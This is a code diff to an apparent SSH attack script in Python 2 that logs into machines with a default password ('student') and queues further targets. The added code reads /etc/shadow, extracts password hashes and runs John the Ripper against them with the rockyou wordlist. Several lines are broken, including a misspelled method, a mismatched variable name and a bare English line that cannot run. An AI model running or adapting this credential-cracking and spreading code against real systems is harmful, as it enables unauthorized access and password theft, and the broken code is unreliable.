@@ -13,6 +13,7 @@ import threading
 
 g_verbose = True
 
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
 DEFAULT_PASS = "student"
 ROOT = "root"
 q = Queue.Queue()
@@ -151,6 +152,30 @@ def begin_attack(client):
     print "QUEUE EMPTY"
 
 
+# shadow_file = file ptr
+def user_hashes(shadow_file):
+    shadow = shadow_file.readlines()
+
+    # filters out the user accounts from the shadow files
+    accts = []
+    for s in shadow:
+        if "$" in s:
+            accts.append(s.trim())
+
+    return accts
+    
+def crack_with_john(hashes_lst):
+    f = open("curr_hashes.txt", "w")
+    f.write(hashes_list)
+    f.close()
+
+    os.system("john --format=sha512crypt --wordlist %s curr_hashes.txt" % (WORDLIST))
+    # get the user/pass output from john
+    hashes = subprocess.Popen("john --show curr_hashes.txt", shell=True, stdout=subprocess.PIPE).communcate()[0]
+    split it into array
+    hashes = hashes.split('\n')
+    
+
 if __name__ == "__main__":
     # init paramiko
     client = paramiko.SSHClient()
@@ -164,11 +189,14 @@ if __name__ == "__main__":
     f.close()
 
     # get initial user/pass shit for john the ripper
-    f = open("/etc/shadow")
-    accts = f.readlines()
+    f = open("/etc/shadow", "r")
+    accts = user_hashes(f)
     f.close()
 
     print accts
+    # output user hashes to a file so john can crack it
+    crack_with_john(accts)
+
     sys.exit(1)
 
     # initialize the queue with starting computer list
